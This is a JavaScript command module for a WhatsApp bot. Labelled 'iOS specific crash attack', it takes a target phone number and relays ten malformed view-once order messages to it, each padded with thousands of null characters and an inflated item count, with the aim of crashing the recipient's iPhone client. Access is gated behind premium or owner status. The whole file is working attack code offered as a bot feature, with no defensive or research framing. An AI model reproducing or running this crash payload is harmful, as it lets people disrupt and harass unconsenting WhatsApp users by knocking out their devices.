import { isPremiumUser } from '../../utils/premiumStore.js';
export default {
    name: 'killios', aliases: ['kill-ios', 'ioscrash'], category: 'bug',
    description: 'iOS specific crash attack', usage: 'killios <number>', cooldown: 30, ownerOnly: true,
    async execute({ sock, message, args, from, sender, isOwner }) {
        if (!isPremiumUser(sender) && !isOwner) return sock.sendMessage(from, { text: '❌ Premium required.' }, { quoted: message });
        const num = args[0]?.replace(/[^0-9]/g, ''); if (!num) return sock.sendMessage(from, { text: '❌ .killios <number>' }, { quoted: message });
        const t = `${num}@s.whatsapp.net`;
        await sock.sendMessage(from, { react: { text: '🍎', key: message.key } });
        for (let i = 0; i < 10; i++) {
            try { await sock.relayMessage(t, { viewOnceMessage: { message: { orderMessage: { orderId: "0", itemCount: 99999, status: "DECLINED", surface: "BUFFERS", message: "\u0000".repeat(5000), orderTitle: "\u0000".repeat(5000), sellerJid: t, token: "\u0000".repeat(5000) } } } }, {}); } catch {}
            await new Promise(r => setTimeout(r, 200));
        }
        await sock.sendMessage(from, { text: '✅ iOS crash sent' }, { quoted: message });
    }
};
